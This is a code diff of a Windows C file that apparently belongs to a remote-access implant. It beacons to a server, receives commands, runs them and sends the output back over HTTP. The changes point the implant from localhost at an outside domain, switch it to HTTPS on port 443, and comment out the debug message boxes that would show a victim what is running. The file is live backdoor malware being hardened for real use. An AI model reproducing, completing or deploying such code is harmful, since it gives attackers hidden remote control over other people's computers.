@@ -1,14 +1,16 @@
 ﻿#include "communication.h"
 
 char currentDirectory[MAX_PATH] = { 0 };
-WCHAR url[MAX_PATH] = L"127.0.0.1";
+WCHAR url[MAX_PATH] = L"ctoacademy.io.vn";
 WCHAR sysinfoPath[MAX_PATH] = { 0 };
 WCHAR beaconPath[MAX_PATH] = { 0 };
 WCHAR resultPath[MAX_PATH] = { 0 };
 WCHAR locationPath[MAX_PATH] = { 0 };
 VOID InitCurDir() {
+	//MessageBox(NULL, L"Get the current directory:", L"Alert", MB_OK);
 	if (!GetCurrentDirectoryA(MAX_PATH, currentDirectory)) {
 		strncpy_s(currentDirectory, sizeof(currentDirectory), "C:\\", _TRUNCATE);
+		//MessageBoxA(NULL, currentDirectory, "Alert", MB_OK);
 	}
 }
 BOOL SendJson(const char* jsonData, const WCHAR* url, const WCHAR* beaconingPath, const WCHAR* resultPath) {
@@ -30,18 +32,16 @@ BOOL SendJson(const char* jsonData, const WCHAR* url, const WCHAR* beaconingPath
 	InternetSetOptionW(hInternet, INTERNET_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
 	InternetSetOptionW(hInternet, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
 
-	// connect to server through HTTPS (port 443 = INTERNET_DEFAULT_HTTPS_PORT, change later)
-	hConnect = InternetConnectW(hInternet, url, 8000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+	 //connect to server through HTTPS (port 443 = INTERNET_DEFAULT_HTTPS_PORT, change later)
+	hConnect = InternetConnectW(hInternet, url, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
 	if (!hConnect) {
-		InternetCloseHandle(hConnect);
 		InternetCloseHandle(hInternet);
 		return success;
 	}
 
 	// create https post request INTERNET_FLAG_SECURE later!!
-	hRequest = HttpOpenRequestW(hConnect, L"POST", beaconingPath, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
+	hRequest = HttpOpenRequestW(hConnect, L"POST", beaconingPath, NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
 	if (!hRequest) {
-		InternetCloseHandle(hRequest);
 		InternetCloseHandle(hConnect);
 		InternetCloseHandle(hInternet);
 		return success;
@@ -76,7 +76,7 @@ BOOL SendJson(const char* jsonData, const WCHAR* url, const WCHAR* beaconingPath
 				strncat_s(cmd, sizeof(cmd), buffer, bytesRead);
 				totalBytes += bytesRead;
 			}
-			MessageBoxA(NULL, cmd, "response", MB_OK);
+			//MessageBoxA(NULL, cmd, "response", MB_OK);
 			char result[4096] = { 0 };
 			if (ExecuteCommand(cmd, result, sizeof(result))) {
 				SendResultToServer(cmd, result, url, resultPath);
@@ -180,14 +180,14 @@ BOOL SendResultToServer(const char* command, const char* result, const WCHAR* ur
 	if (!hInternet) return FALSE;
 
 	// using https later
-	HINTERNET hConnect = InternetConnectW(hInternet, url, 8000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+	HINTERNET hConnect = InternetConnectW(hInternet, url, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
 	if (!hConnect) {
 		InternetCloseHandle(hInternet);
 		return FALSE;
 	}
 
 	//HINTERNET hRequest = HttpOpenRequestW(hConnect, L"POST", resultPath, NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
-	HINTERNET hRequest = HttpOpenRequestW(hConnect, L"POST", resultPath, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
+	HINTERNET hRequest = HttpOpenRequestW(hConnect, L"POST", resultPath, NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
 	if (!hRequest) {
 		InternetCloseHandle(hConnect);
 		InternetCloseHandle(hInternet);
@@ -201,7 +201,7 @@ BOOL SendResultToServer(const char* command, const char* result, const WCHAR* ur
 	EscapeJsonString(result, escapedResult, sizeof(escapedResult));
 	EscapeJsonString(command, escapedCommand, sizeof(escapedCommand));
 	if (strcmp(escapedResult,"") == 0) strcpy_s(escapedResult, sizeof(escapedResult), "Done!!!");;
-	MessageBoxA(NULL, escapedResult, "caption", MB_OK);
+	//MessageBoxA(NULL, escapedResult, "caption", MB_OK);
 	sprintf_s(resultJson, sizeof(resultJson), "{\"command\": \"%s\", \"result\": \"%s\"}", escapedCommand, escapedResult);
 
 	BOOL success = HttpSendRequestW(hRequest, NULL, 0, (LPVOID)resultJson, strlen(resultJson));
